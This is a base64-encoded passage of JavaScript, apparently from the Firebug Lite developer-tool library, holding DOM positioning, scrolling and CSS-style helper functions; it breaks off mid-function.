yZXR1cm4gZGltczsNCn07DQoNCnRoaXMuYXBwbHlCb2R5T2Zmc2V0cyA9IGZ1bmN0aW9uKGVsdCwgY2xpZW50UmVjdCkNCnsNCiAgICB2YXIgb2QgPSBlbHQub3duZXJEb2N1bWVudDsNCiAgICBpZiAoIW9kLmJvZHkpDQogICAgICAgIHJldHVybiBjbGllbnRSZWN0Ow0KDQogICAgdmFyIHN0eWxlID0gb2QuZGVmYXVsdFZpZXcuZ2V0Q29tcHV0ZWRTdHlsZShvZC5ib2R5LCBudWxsKTsNCg0KICAgIHZhciBwb3MgPSBzdHlsZS5nZXRQcm9wZXJ0eVZhbHVlKCdwb3NpdGlvbicpOw0KICAgIGlmKHBvcyA9PT0gJ2Fic29sdXRlJyB8fCBwb3MgPT09ICdyZWxhdGl2ZScpDQogICAgew0KICAgICAgICB2YXIgYm9yZGVyTGVmdCA9IHBhcnNlSW50KHN0eWxlLmdldFByb3BlcnR5VmFsdWUoJ2JvcmRlci1sZWZ0LXdpZHRoJykucmVwbGFjZSgncHgnLCAnJyksMTApIHx8IDA7DQogICAgICAgIHZhciBib3JkZXJUb3AgPSBwYXJzZUludChzdHlsZS5nZXRQcm9wZXJ0eVZhbHVlKCdib3JkZXItdG9wLXdpZHRoJykucmVwbGFjZSgncHgnLCAnJyksMTApIHx8IDA7DQogICAgICAgIHZhciBwYWRkaW5nTGVmdCA9IHBhcnNlSW50KHN0eWxlLmdldFByb3BlcnR5VmFsdWUoJ3BhZGRpbmctbGVmdCcpLnJlcGxhY2UoJ3B4JywgJycpLDEwKSB8fCAwOw0KICAgICAgICB2YXIgcGFkZGluZ1RvcCA9IHBhcnNlSW50KHN0eWxlLmdldFByb3BlcnR5VmFsdWUoJ3BhZGRpbmctdG9wJykucmVwbGFjZSgncHgnLCAnJyksMTApIHx8IDA7DQogICAgICAgIHZhciBtYXJnaW5MZWZ0ID0gcGFyc2VJbnQoc3R5bGUuZ2V0UHJvcGVydHlWYWx1ZSgnbWFyZ2luLWxlZnQnKS5yZXBsYWNlKCdweCcsICcnKSwxMCkgfHwgMDsNCiAgICAgICAgdmFyIG1hcmdpblRvcCA9IHBhcnNlSW50KHN0eWxlLmdldFByb3BlcnR5VmFsdWUoJ21hcmdpbi10b3AnKS5yZXBsYWNlKCdweCcsICcnKSwxMCkgfHwgMDsNCg0KICAgICAgICB2YXIgb2Zmc2V0WCA9IGJvcmRlckxlZnQgKyBwYWRkaW5nTGVmdCArIG1hcmdpbkxlZnQ7DQogICAgICAgIHZhciBvZmZzZXRZID0gYm9yZGVyVG9wICsgcGFkZGluZ1RvcCArIG1hcmdpblRvcDsNCg0KICAgICAgICBjbGllbnRSZWN0LmxlZnQgLT0gb2Zmc2V0WDsNCiAgICAgICAgY2xpZW50UmVjdC50b3AgLT0gb2Zmc2V0WTsNCiAgICAgICAgY2xpZW50UmVjdC5yaWdodCAtPSBvZmZzZXRYOw0KICAgICAgICBjbGllbnRSZWN0LmJvdHRvbSAtPSBvZmZzZXRZOw0KICAgIH0NCg0KICAgIHJldHVybiBjbGllbnRSZWN0Ow0KfTsNCg0KdGhpcy5nZXRPZmZzZXRTaXplID0gZnVuY3Rpb24oZWx0KQ0Kew0KICAgIHJldHVybiB7d2lkdGg6IGVsdC5vZmZzZXRXaWR0aCwgaGVpZ2h0OiBlbHQub2Zmc2V0SGVpZ2h0fTsNCn07DQoNCnRoaXMuZ2V0T3ZlcmZsb3dQYXJlbnQgPSBmdW5jdGlvbihlbGVtZW50KQ0Kew0KICAgIGZvciAodmFyIHNjcm9sbFBhcmVudCA9IGVsZW1lbnQucGFyZW50Tm9kZTsgc2Nyb2xsUGFyZW50OyBzY3JvbGxQYXJlbnQgPSBzY3JvbGxQYXJlbnQub2Zmc2V0UGFyZW50KQ0KICAgIHsNCiAgICAgICAgaWYgKHNjcm9sbFBhcmVudC5zY3JvbGxIZWlnaHQgPiBzY3JvbGxQYXJlbnQub2Zmc2V0SGVpZ2h0KQ0KICAgICAgICAgICAgcmV0dXJuIHNjcm9sbFBhcmVudDsNCiAgICB9DQp9Ow0KDQp0aGlzLmlzU2Nyb2xsZWRUb0JvdHRvbSA9IGZ1bmN0aW9uKGVsZW1lbnQpDQp7DQogICAgdmFyIG9uQm90dG9tID0gKGVsZW1lbnQuc2Nyb2xsVG9wICsgZWxlbWVudC5vZmZzZXRIZWlnaHQpID09IGVsZW1lbnQuc2Nyb2xsSGVpZ2h0Ow0KICAgIGlmIChGQlRyYWNlLkRCR19DT05TT0xFKQ0KICAgICAgICBGQlRyYWNlLnN5c291dCgiaXNTY3JvbGxlZFRvQm90dG9tIG9mZnNldEhlaWdodDogIitlbGVtZW50Lm9mZnNldEhlaWdodCArIiBvbkJvdHRvbToiK29uQm90dG9tKTsNCiAgICByZXR1cm4gb25Cb3R0b207DQp9Ow0KDQp0aGlzLnNjcm9sbFRvQm90dG9tID0gZnVuY3Rpb24oZWxlbWVudCkNCnsNCiAgICAgICAgZWxlbWVudC5zY3JvbGxUb3AgPSBlbGVtZW50LnNjcm9sbEhlaWdodDsNCg0KICAgICAgICBpZiAoRkJUcmFjZS5EQkdfQ09OU09MRSkNCiAgICAgICAgew0KICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoInNjcm9sbFRvQm90dG9tIHJlc2V0IHNjcm9sbFRvcCAiK2VsZW1lbnQuc2Nyb2xsVG9wKyIgPSAiK2VsZW1lbnQuc2Nyb2xsSGVpZ2h0KTsNCiAgICAgICAgICAgIGlmIChlbGVtZW50LnNjcm9sbEhlaWdodCA9PSBlbGVtZW50Lm9mZnNldEhlaWdodCkNCiAgICAgICAgICAgICAgICBGQlRyYWNlLnN5c291dCgic2Nyb2xsVG9Cb3R0b20gYXR0ZW1wdCB0byBzY3JvbGwgbm9uLXNjcm9sbGFibGUgZWxlbWVudCAiK2VsZW1lbnQsIGVsZW1lbnQpOw0KICAgICAgICB9DQoNCiAgICAgICAgcmV0dXJuIChlbGVtZW50LnNjcm9sbFRvcCA9PSBlbGVtZW50LnNjcm9sbEhlaWdodCk7DQp9Ow0KDQp0aGlzLm1vdmUgPSBmdW5jdGlvbihlbGVtZW50LCB4LCB5KQ0Kew0KICAgIGVsZW1lbnQuc3R5bGUubGVmdCA9IHggKyAicHgiOw0KICAgIGVsZW1lbnQuc3R5bGUudG9wID0geSArICJweCI7DQp9Ow0KDQp0aGlzLnJlc2l6ZSA9IGZ1bmN0aW9uKGVsZW1lbnQsIHcsIGgpDQp7DQogICAgZWxlbWVudC5zdHlsZS53aWR0aCA9IHcgKyAicHgiOw0KICAgIGVsZW1lbnQuc3R5bGUuaGVpZ2h0ID0gaCArICJweCI7DQp9Ow0KDQp0aGlzLmxpbmVzSW50b0NlbnRlclZpZXcgPSBmdW5jdGlvbihlbGVtZW50LCBzY3JvbGxCb3gpICAvLyB7YmVmb3JlOiBpbnQsIGFmdGVyOiBpbnR9DQp7DQogICAgaWYgKCFzY3JvbGxCb3gpDQogICAgICAgIHNjcm9sbEJveCA9IHRoaXMuZ2V0T3ZlcmZsb3dQYXJlbnQoZWxlbWVudCk7DQoNCiAgICBpZiAoIXNjcm9sbEJveCkNCiAgICAgICAgcmV0dXJuOw0KDQogICAgdmFyIG9mZnNldCA9IHRoaXMuZ2V0Q2xpZW50T2Zmc2V0KGVsZW1lbnQpOw0KDQogICAgdmFyIHRvcFNwYWNlID0gb2Zmc2V0LnkgLSBzY3JvbGxCb3guc2Nyb2xsVG9wOw0KICAgIHZhciBib3R0b21TcGFjZSA9IChzY3JvbGxCb3guc2Nyb2xsVG9wICsgc2Nyb2xsQm94LmNsaWVudEhlaWdodCkNCiAgICAgICAgICAgIC0gKG9mZnNldC55ICsgZWxlbWVudC5vZmZzZXRIZWlnaHQpOw0KDQogICAgaWYgKHRvcFNwYWNlIDwgMCB8fCBib3R0b21TcGFjZSA8IDApDQogICAgew0KICAgICAgICB2YXIgc3BsaXQgPSAoc2Nyb2xsQm94LmNsaWVudEhlaWdodC8yKTsNCiAgICAgICAgdmFyIGNlbnRlclkgPSBvZmZzZXQueSAtIHNwbGl0Ow0KICAgICAgICBzY3JvbGxCb3guc2Nyb2xsVG9wID0gY2VudGVyWTsNCiAgICAgICAgdG9wU3BhY2UgPSBzcGxpdDsNCiAgICAgICAgYm90dG9tU3BhY2UgPSBzcGxpdCAtICBlbGVtZW50Lm9mZnNldEhlaWdodDsNCiAgICB9DQoNCiAgICByZXR1cm4ge2JlZm9yZTogTWF0aC5yb3VuZCgodG9wU3BhY2UvZWxlbWVudC5vZmZzZXRIZWlnaHQpICsgMC41KSwNCiAgICAgICAgICAgIGFmdGVyOiBNYXRoLnJvdW5kKChib3R0b21TcGFjZS9lbGVtZW50Lm9mZnNldEhlaWdodCkgKyAwLjUpIH07DQp9Ow0KDQp0aGlzLnNjcm9sbEludG9DZW50ZXJWaWV3ID0gZnVuY3Rpb24oZWxlbWVudCwgc2Nyb2xsQm94LCBub3RYLCBub3RZKQ0Kew0KICAgIGlmICghZWxlbWVudCkNCiAgICAgICAgcmV0dXJuOw0KDQogICAgaWYgKCFzY3JvbGxCb3gpDQogICAgICAgIHNjcm9sbEJveCA9IHRoaXMuZ2V0T3ZlcmZsb3dQYXJlbnQoZWxlbWVudCk7DQoNCiAgICBpZiAoIXNjcm9sbEJveCkNCiAgICAgICAgcmV0dXJuOw0KDQogICAgdmFyIG9mZnNldCA9IHRoaXMuZ2V0Q2xpZW50T2Zmc2V0KGVsZW1lbnQpOw0KDQogICAgaWYgKCFub3RZKQ0KICAgIHsNCiAgICAgICAgdmFyIHRvcFNwYWNlID0gb2Zmc2V0LnkgLSBzY3JvbGxCb3guc2Nyb2xsVG9wOw0KICAgICAgICB2YXIgYm90dG9tU3BhY2UgPSAoc2Nyb2xsQm94LnNjcm9sbFRvcCArIHNjcm9sbEJveC5jbGllbnRIZWlnaHQpDQogICAgICAgICAgICAtIChvZmZzZXQueSArIGVsZW1lbnQub2Zmc2V0SGVpZ2h0KTsNCg0KICAgICAgICBpZiAodG9wU3BhY2UgPCAwIHx8IGJvdHRvbVNwYWNlIDwgMCkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIGNlbnRlclkgPSBvZmZzZXQueSAtIChzY3JvbGxCb3guY2xpZW50SGVpZ2h0LzIpOw0KICAgICAgICAgICAgc2Nyb2xsQm94LnNjcm9sbFRvcCA9IGNlbnRlclk7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBpZiAoIW5vdFgpDQogICAgew0KICAgICAgICB2YXIgbGVmdFNwYWNlID0gb2Zmc2V0LnggLSBzY3JvbGxCb3guc2Nyb2xsTGVmdDsNCiAgICAgICAgdmFyIHJpZ2h0U3BhY2UgPSAoc2Nyb2xsQm94LnNjcm9sbExlZnQgKyBzY3JvbGxCb3guY2xpZW50V2lkdGgpDQogICAgICAgICAgICAtIChvZmZzZXQueCArIGVsZW1lbnQuY2xpZW50V2lkdGgpOw0KDQogICAgICAgIGlmIChsZWZ0U3BhY2UgPCAwIHx8IHJpZ2h0U3BhY2UgPCAwKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgY2VudGVyWCA9IG9mZnNldC54IC0gKHNjcm9sbEJveC5jbGllbnRXaWR0aC8yKTsNCiAgICAgICAgICAgIHNjcm9sbEJveC5zY3JvbGxMZWZ0ID0gY2VudGVyWDsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBpZiAoRkJUcmFjZS5EQkdfU09VUkNFRklMRVMpDQogICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJsaWIuc2Nyb2xsSW50b0NlbnRlclZpZXcgIiwiRWxlbWVudDoiK2VsZW1lbnQuaW5uZXJIVE1MKTsNCn07DQoNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBDU1MNCg0KdmFyIGNzc0tleXdvcmRNYXAgPSBudWxsOw0KdmFyIGNzc1Byb3BOYW1lcyA9IG51bGw7DQp2YXIgY3NzQ29sb3JOYW1lcyA9IG51bGw7DQp2YXIgaW1hZ2VSdWxlcyA9IG51bGw7DQoNCnRoaXMuZ2V0Q1NTS2V5d29yZHNCeVByb3BlcnR5ID0gZnVuY3Rpb24ocHJvcE5hbWUpDQp7DQogICAgaWYgKCFjc3NLZXl3b3JkTWFwKQ0KICAgIHsNCiAgICAgICAgY3NzS2V5d29yZE1hcCA9IHt9Ow0KDQogICAgICAgIGZvciAodmFyIG5hbWUgaW4gdGhpcy5jc3NJbmZvKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgbGlzdCA9IFtdOw0KDQogICAgICAgICAgICB2YXIgdHlwZXMgPSB0aGlzLmNzc0luZm9bbmFtZV07DQogICAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IHR5cGVzLmxlbmd0aDsgKytpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBrZXl3b3JkcyA9IHRoaXMuY3NzS2V5d29yZHNbdHlwZXNbaV1dOw0KICAgICAgICAgICAgICAgIGlmIChrZXl3b3JkcykNCiAgICAgICAgICAgICAgICAgICAgbGlzdC5wdXNoLmFwcGx5KGxpc3QsIGtleXdvcmRzKTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgY3NzS2V5d29yZE1hcFtuYW1lXSA9IGxpc3Q7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICByZXR1cm4gcHJvcE5hbWUgaW4gY3NzS2V5d29yZE1hcCA/IGNzc0tleXdvcmRNYXBbcHJvcE5hbWVdIDogW107DQp9Ow0KDQp0aGlzLmdldENTU1Byb3BlcnR5TmFtZXMgPSBmdW5jdGlvbigpDQp7DQogICAgaWYgKCFjc3NQcm9wTmFtZXMpDQogICAgew0KICAgICAgICBjc3NQcm9wTmFtZXMgPSBbXTsNCg0KICAgICAgICBmb3IgKHZhciBuYW1lIGluIHRoaXMuY3NzSW5mbykNCiAgICAgICAgICAgIGNzc1Byb3BOYW1lcy5wdXNoKG5hbWUpOw0KICAgIH0NCg0KICAgIHJldHVybiBjc3NQcm9wTmFtZXM7DQp9Ow0KDQp0aGlzLmlzQ29sb3JLZXl3b3JkID0gZnVuY3Rpb24oa2V5d29yZCkNCnsNCiAgICBpZiAoa2V5d29yZCA9PSAidHJhbnNwYXJlbnQiKQ0KICAgICAgICByZXR1cm4gZmFsc2U7DQoNCiAgICBpZiAoIWNzc0NvbG9yTmFtZXMpDQogICAgew0KICAgICAgICBjc3NDb2xvck5hbWVzID0gW107DQoNCiAgICAgICAgdmFyIGNvbG9ycyA9IHRoaXMuY3NzS2V5d29yZHNbImNvbG9yIl07DQogICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgY29sb3JzLmxlbmd0aDsgKytpKQ0KICAgICAgICAgICAgY3NzQ29sb3JOYW1lcy5wdXNoKGNvbG9yc1tpXS50b0xvd2VyQ2FzZSgpKTsNCg0KICAgICAgICB2YXIgc3lzdGVtQ29sb3JzID0gdGhpcy5jc3NLZXl3b3Jkc1sic3lzdGVtQ29sb3IiXTsNCiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBzeXN0ZW1Db2xvcnMubGVuZ3RoOyArK2kpDQogICAgICAgICAgICBjc3NDb2xvck5hbWVzLnB1c2goc3lzdGVtQ29sb3JzW2ldLnRvTG93ZXJDYXNlKCkpOw0KICAgIH0NCg0KICAgIHJldHVybiBjc3NDb2xvck5hbWVzLmluZGV4T2YgPyAvLyBBcnJheS5pbmRleE9mIGlzIG5vdCBhdmFpbGFibGUgaW4gSUUNCiAgICAgICAgICAgIGNzc0NvbG9yTmFtZXMuaW5kZXhPZihrZXl3b3JkLnRvTG93ZXJDYXNlKCkpICE9IC0xIDoNCiAgICAgICAgICAgICgiICIgKyBjc3NDb2xvck5hbWVzLmpvaW4oIiAiKSArICIgIikuaW5kZXhPZigiICIgKyBrZXl3b3JkLnRvTG93ZXJDYXNlKCkgKyAiICIpICE9IC0xOw0KfTsNCg0KdGhpcy5pc0ltYWdlUnVsZSA9IGZ1bmN0aW9uKHJ1bGUpDQp7DQogICAgaWYgKCFpbWFnZVJ1bGVzKQ0KICAgIHsNCiAgICAgICAgaW1hZ2VSdWxlcyA9IFtdOw0KDQogICAgICAgIGZvciAodmFyIGkgaW4gdGhpcy5jc3NJbmZvKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgciA9IGkudG9Mb3dlckNhc2UoKTsNCiAgICAgICAgICAgIHZhciBzdWZmaXggPSAiaW1hZ2UiOw0KICAgICAgICAgICAgaWYgKHIubWF0Y2goc3VmZml4ICsgIiQiKSA9PSBzdWZmaXggfHwgciA9PSAiYmFja2dyb3VuZCIpDQogICAgICAgICAgICAgICAgaW1hZ2VSdWxlcy5wdXNoKHIpOw0KICAgICAgICB9DQogICAgfQ0KDQogICAgcmV0dXJuIGltYWdlUnVsZXMuaW5kZXhPZiA/IC8vIEFycmF5LmluZGV4T2YgaXMgbm90IGF2YWlsYWJsZSBpbiBJRQ0KICAgICAgICAgICAgaW1hZ2VSdWxlcy5pbmRleE9mKHJ1bGUudG9Mb3dlckNhc2UoKSkgIT0gLTEgOg0KICAgICAgICAgICAgKCIgIiArIGltYWdlUnVsZXMuam9pbigiICIpICsgIiAiKS5pbmRleE9mKCIgIiArIHJ1bGUudG9Mb3dlckNhc2UoKSArICIgIikgIT0gLTE7DQp9Ow0KDQp0aGlzLmNvcHlUZXh0U3R5bGVzID0gZnVuY3Rpb24oZnJvbU5vZGUsIHRvTm9kZSwgc3R5bGUpDQp7DQogICAgdmFyIHZpZXcgPSB0aGlzLmlzSUUgPw0KICAgICAgICAgICAgZnJvbU5vZGUub3duZXJEb2N1bWVudC5wYXJlbnRXaW5kb3cgOg0KICAgICAgICAgICAgZnJvbU5vZGUub3duZXJEb2N1bWVudC5kZWZhdWx0VmlldzsNCiAgICANCiAgICBpZiAodmlldykNCiAgICB7DQogICAgICAgIGlmICghc3R5bGUpDQogICAgICAgICAgICBzdHlsZSA9IHRoaXMuaXNJRSA/IGZyb21Ob2RlLmN1cnJlbnRTdHlsZSA6IHZpZXcuZ2V0Q29tcHV0ZWRTdHlsZShmcm9tTm9kZSwgIiIpOw0KDQogICAgICAgIHRvTm9kZS5zdHlsZS5mb250RmFtaWx5ID0gc3R5bGUuZm9udEZhbWlseTsNCiAgICAgICAgDQogICAgICAgIC8vIFRPRE86IHh4eHBlZHJvIG5lZWQgdG8gY3JlYXRlIGEgRkJMLmdldENvbXB1dGVkU3R5bGUoKSBiZWNhdXNlIElFDQogICAgICAgIC8vIHJldHVybnMgd3JvbmcgY29tcHV0ZWQgc3R5bGVzIGZvciBpbmhlcml0ZWQgcHJvcGVydGllcyAobGlrZSBmb250LSopDQogICAgICAgIC8vDQogICAgICAgIC8vIEFsc28gd291bGQgYmUgZ29vZCB0byBjcmVhdGUgYSBGQkwuZ2V0U3R5bGUoKSANCiAgICAgICAgdG9Ob2RlLnN0eWxlLmZvbnRTaXplID0gc3R5bGUuZm9udFNpemU7DQogICAgICAgIHRvTm9kZS5zdHlsZS5mb250V2VpZ2h0ID0gc3R5bGUuZm9udFdlaWdodDsNCiAgICAgICAgdG9Ob2RlLnN0eWxlLmZvbnRTdHlsZSA9IHN0eWxlLmZvbnRTdHlsZTsNCg0KICAgICAgICByZXR1cm4gc3R5bGU7DQogICAgfQ0KfTsNCg0KdGhpcy5jb3B5Qm94U3R5bGVzID0gZnVuY3Rpb24oZnJvbU5vZGUsIHRvTm9kZSwgc3R5bGUpDQp7DQogICAgdmFyIHZpZXcgPSB0aGlzLmlzSUUgPw0KICAgICAgICAgICAgZnJvbU5vZGUub3duZXJEb2N1bWVudC5wYXJlbnRXaW5kb3cgOg0KICAgICAgICAgICAgZnJvbU5vZGUub3duZXJEb2N1bWVudC5kZWZhdWx0VmlldzsNCiAgICANCiAgICBpZiAodmlldykNCiAgICB7DQogICAgICAgIGlmICghc3R5bGUpDQogICAgICAgICAgICBzdHlsZSA9IHRoaXMuaXNJRSA/IGZyb21Ob2RlLmN1cnJlbnRTdHlsZSA6IHZpZXcuZ2V0Q29tcHV0ZWRTdHlsZShmcm9tTm9kZSwgIiIpOw0KDQogICAgICAgIHRvTm9kZS5zdHlsZS5tYXJnaW5Ub3AgPSBzdHlsZS5tYXJnaW5Ub3A7DQogICAgICAgIHRvTm9kZS5zdHlsZS5tYXJnaW5SaWdodCA9IHN0eWxlLm1hcmdpblJpZ2h0Ow0KICAgICAgICB0b05vZGUuc3R5bGUubWFyZ2luQm90dG9tID0gc3R5bGUubWFyZ2luQm90dG9tOw0KICAgICAgICB0b05vZGUuc3R5bGUubWFyZ2luTGVmdCA9IHN0eWxlLm1hcmdpbkxlZnQ7DQogICAgICAgIHRvTm9kZS5zdHlsZS5ib3JkZXJUb3BXaWR0aCA9IHN0eWxlLmJvcmRlclRvcFdpZHRoOw0KICAgICAgICB0b05vZGUuc3R5bGUuYm9yZGVyUmlnaHRXaWR0aCA9IHN0eWxlLmJvcmRlclJpZ2h0V2lkdGg7DQogICAgICAgIHRvTm9kZS5zdHlsZS5ib3JkZXJCb3R0b21XaWR0aCA9IHN0eWxlLmJvcmRlckJvdHRvbVdpZHRoOw0KICAgICAgICB0b05vZGUuc3R5bGUuYm9yZGVyTGVmdFdpZHRoID0gc3R5bGUuYm9yZGVyTGVmdFdpZHRoOw0KDQogICAgICAgIHJldHVybiBzdHlsZTsNCiAgICB9DQp9Ow0KDQp0aGlzLnJlYWRCb3hTdHlsZXMgPSBmdW5jdGlvbihzdHlsZSkNCnsNCiAgICB2YXIgc3R5bGVOYW1lcyA9IHsNCiAgICAgICAgIm1hcmdpbi10b3AiOiAibWFyZ2luVG9wIiwgIm1hcmdpbi1yaWdodCI6ICJtYXJnaW5SaWdodCIsDQogICAgICAgICJtYXJnaW4tbGVmdCI6ICJtYXJnaW5MZWZ0IiwgIm1hcmdpbi1ib3R0b20iOiAibWFyZ2luQm90dG9tIiwNCiAgICAgICAgImJvcmRlci10b3Atd2lkdGgiOiAiYm9yZGVyVG9wIiwgImJvcmRlci1yaWdodC13aWR0aCI6ICJib3JkZXJSaWdodCIsDQogICAgICAgICJib3JkZXItbGVmdC13aWR0aCI6ICJib3JkZXJMZWZ0IiwgImJvcmRlci1ib3R0b20td2lkdGgiOiAiYm9yZGVyQm90dG9tIiwNCiAgICAgICAgInBhZGRpbmctdG9wIjogInBhZGRpbmdUb3AiLCAicGFkZGluZy1yaWdodCI6ICJwYWRkaW5nUmlnaHQiLA0KICAgICAgICAicGFkZGluZy1sZWZ0IjogInBhZGRpbmdMZWZ0IiwgInBhZGRpbmctYm90dG9tIjogInBhZGRpbmdCb3R0b20iLA0KICAgICAgICAiei1pbmRleCI6ICJ6SW5kZXgiDQogICAgfTsNCg0KICAgIHZhciBzdHlsZXMgPSB7fTsNCiAgICBmb3IgKHZhciBzdHlsZU5hbWUgaW4gc3R5bGVOYW1lcykNCiAgICAgICAgc3R5bGVzW3N0eWxlTmFtZXNbc3R5bGVOYW1lXV0gPSBwYXJzZUludChzdHlsZS5nZXRQcm9wZXJ0eUNTU1ZhbHVlKHN0eWxlTmFtZSkuY3NzVGV4dCkgfHwgMDsNCiAgICBpZiAoRkJUcmFjZS5EQkdfSU5TUEVDVCkNCiAgICAgICAgRkJUcmFjZS5zeXNvdXQoInJlYWRCb3hTdHlsZXMgIiwgc3R5bGVzKTsNCiAgICByZXR1cm4gc3R5bGVzOw0KfTsNCg0KdGhpcy5nZXRCb3hGcm9tU3R5bGVzID0gZnVuY3Rpb24oc3R5bGUsIGVsZW1lbnQpDQp7DQogICAgdmFyIGFyZ3MgPSB0aGlzLnJlYWRCb3hTdHlsZXMoc3R5bGUpOw0KICAgIGFyZ3Mud2lkdGggPSBlbGVtZW50Lm9mZnNldFdpZHRoDQogICAgICAgIC0gKGFyZ3MucGFkZGluZ0xlZnQrYXJncy5wYWRkaW5nUmlnaHQrYXJncy5ib3JkZXJMZWZ0K2FyZ3MuYm9yZGVyUmlnaHQpOw0KICAgIGFyZ3MuaGVpZ2h0ID0gZWxlbWVudC5vZmZzZXRIZWlnaHQNCiAgICAgICAgLSAoYXJncy5wYWRkaW5nVG9wK2FyZ3MucGFkZGluZ0JvdHRvbSthcmdzLmJvcmRlclRvcCthcmdzLmJvcmRlckJvdHRvbSk7DQogICAgcmV0dXJuIGFyZ3M7DQp9Ow0KDQp0aGlzLmdldEVsZW1lbnRDU1NTZWxlY3RvciA9IGZ1bmN0aW9uKGVsZW1lbnQpDQp7DQogICAgdmFyIGxhYmVsID0gZWxlbWVudC5sb2NhbE5hbWUudG9Mb3dlckNhc2UoKTsNCiAgICBpZiAoZWxlbWVudC5pZCkNCiAgICAgICAgbGFiZWwgKz0gIiMiICsgZWxlbWVudC5pZDsNCiAgICBpZiAoZWxlbWVudC5oYXNBdHRyaWJ1dGUoImNsYXNzIikpDQogICAgICAgIGxhYmVsICs9ICIuIiArIGVsZW1lbnQuZ2V0QXR0cmlidXRlKCJjbGFzcyIpLnNwbGl0KCIgIilbMF07DQoNCiAgICByZXR1cm4gbGFiZWw7DQp9Ow0KDQp0aGlzLmdldFVSTEZvclN0eWxlU2hlZXQ9IGZ1bmN0aW9uKHN0eWxlU2hlZXQpDQp7DQogICAgLy9odHRwOi8vd3d3LnczLm9yZy9UUi9ET00tTGV2ZWwtMi1TdHlsZS9zdHlsZXNoZWV0cy5odG1sI1N0eWxlU2hlZXRzLVN0eWxlU2hlZXQuIEZvciBpbmxpbmUgc3R5bGUgc2hlZXRzLCB0aGUgdmFsdWUgb2YgdGhpcyBhdHRyaWJ1dGUgaXMgbnVsbC4NCiAgICByZXR1cm4gKHN0eWxlU2hlZXQuaHJlZiA/IHN0eWxlU2hlZXQuaHJlZiA6IHN0eWxlU2hlZXQub3duZXJOb2RlLm93bmVyRG9jdW1lbnQuVVJMKTsNCn07DQoNCnRoaXMuZ2V0RG9jdW1lbnRGb3JTdHlsZVNoZWV0ID0gZnVuY3Rpb24oc3R5bGVTaGVldCkNCnsNCiAgICB3aGlsZSAoc3R5bGVTaGVldC5wYXJlbnRTdHlsZVNoZWV0ICYmICFzdHlsZVNoZWV0Lm93bmVyTm9kZSkNCiAgICB7DQogICAgICAgIHN0eWxlU2hlZXQgPSBzdHlsZVNoZWV0LnBhcmVudFN0eWxlU2hlZXQ7DQogICAgfQ0KICAgIGlmIChzdHlsZVNoZWV0Lm93bmVyTm9kZSkNCiAgICAgIHJldHVybiBzdHlsZVNoZWV0Lm93bmVyTm9kZS5vd25lckRvY3VtZW50Ow0KfTsNCg0KLyoqDQogKiBSZXRyaWV2ZXMgdGhlIGluc3RhbmNlIG51bWJlciBmb3IgYSBnaXZlbiBzdHlsZSBzaGVldC4gVGhlIGluc3RhbmNlIG51bWJlcg0KICogaXMgc2hlZXQncyBpbmRleCB3aXRoaW4gdGhlIHNldCBvZiBhbGwgb3RoZXIgc2hlZXRzIHdob3NlIFVSTCBpcyB0aGUgc2FtZS4NCiAqLw0KdGhpcy5nZXRJbnN0YW5jZUZvclN0eWxlU2hlZXQgPSBmdW5jdGlvbihzdHlsZVNoZWV0LCBvd25lckRvY3VtZW50KQ0Kew0KICAgIC8vIFN5c3RlbSBVUkxzIGFyZSBhbHdheXMgdW5pcXVlIChvciBhdCBsZWFzdCB3ZSBhcmUgbWFraW5nIHRoaXMgYXNzdW1wdGlvbikNCiAgICBpZiAoRkJMLmlzU3lzdGVtU3R5bGVTaGVldChzdHlsZVNoZWV0KSkNCiAgICAgICAgcmV0dXJuIDA7DQoNCiAgICAvLyBvd25lckRvY3VtZW50IGlzIGFuIG9wdGlvbmFsIGhpbnQgZm9yIHBlcmZvcm1hbmNlDQogICAgaWYgKEZCVHJhY2UuREJHX0NTUykgRkJUcmFjZS5zeXNvdXQoImdldEluc3RhbmNlRm9yU3R5bGVTaGVldDogIiArIHN0eWxlU2hlZXQuaHJlZiArICIgIiArIHN0eWxlU2hlZXQubWVkaWEubWVkaWFUZXh0ICsgIiAiICsgKHN0eWxlU2hlZXQub3duZXJOb2RlICYmIEZCTC5nZXRFbGVtZW50WFBhdGgoc3R5bGVTaGVldC5vd25lck5vZGUpKSwgb3duZXJEb2N1bWVudCk7DQogICAgb3duZXJEb2N1bWVudCA9IG93bmVyRG9jdW1lbnQgfHwgRkJMLmdldERvY3VtZW50Rm9yU3R5bGVTaGVldChzdHlsZVNoZWV0KTsNCg0KICAgIHZhciByZXQgPSAwLA0KICAgICAgICBzdHlsZVNoZWV0cyA9IG93bmVyRG9jdW1lbnQuc3R5bGVTaGVldHMsDQogICAgICAgIGhyZWYgPSBzdHlsZVNoZWV0LmhyZWY7DQogICAgZm9yICh2YXIgaSA9IDA7IGkgPCBzdHlsZVNoZWV0cy5sZW5ndGg7IGkrKykNCiAgICB7DQogICAgICAgIHZhciBjdXJTaGVldCA9IHN0eWxlU2hlZXRzW2ldOw0KICAgICAgICBpZiAoRkJUcmFjZS5EQkdfQ1NTKSBGQlRyYWNlLnN5c291dCgiZ2V0SW5zdGFuY2VGb3JTdHlsZVNoZWV0OiBjb21wYXJlIGhyZWYgIiArIGkgKyAiICIgKyBjdXJTaGVldC5ocmVmICsgIiAiICsgY3VyU2hlZXQubWVkaWEubWVkaWFUZXh0ICsgIiAiICsgKGN1clNoZWV0Lm93bmVyTm9kZSAmJiBGQkwuZ2V0RWxlbWVudFhQYXRoKGN1clNoZWV0Lm93bmVyTm9kZSkpKTsNCiAgICAgICAgaWYgKGN1clNoZWV0ID09IHN0eWxlU2hlZXQpDQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgaWYgK